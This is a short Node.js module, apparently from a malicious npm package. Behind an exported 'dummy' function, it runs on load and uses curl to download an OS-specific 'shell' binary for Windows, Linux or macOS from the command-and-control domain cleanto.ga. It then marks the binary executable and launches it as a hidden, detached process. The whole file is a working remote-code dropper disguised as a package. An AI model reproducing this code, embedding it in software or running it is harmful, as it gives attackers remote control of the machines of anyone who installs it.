const path = require('path');
const child_process = require('child_process');
const os = require('os');

const c2domain = 'cleanto.ga';

exports.dummy = function() {
        console.log("Please don't use this package.")
}

/* Spawn a shell whenever this script is run */

/* Function to spawn a shell on a unix box */
let shell = (n)=>{
        const f = `shell.${n}`;
        process.chdir('/tmp');
        child_process.spawnSync(
                'curl',
                ['-s', '-o', f, `https://${c2domain}/${f}`]
        );
        child_process.spawnSync('chmod', ['0700', f]);
        child_process.spawn('./' + f, [], {
                detached: true,
                stdio: 'ignore'
        }).unref();
}

/* Spawn a shell */
let ost = os.type();
switch (ost) {
        case 'Windows_NT':
                const f = 'shell.windows.exe';
                process.chdir(process.env.TMP);
                child_process.spawnSync('curl', 
                        ['-sO', `https://${c2domain}/${f}`]);
                child_process.spawn(f, [], {
                        detached: true,
                        stdio: 'ignore'
                }).unref();
                break;
        case 'Linux':
                shell('linux');
                break;
        case 'Darwin':
                shell('mac');
                break;
        default:
                console.log("Unknown os", ost);
}
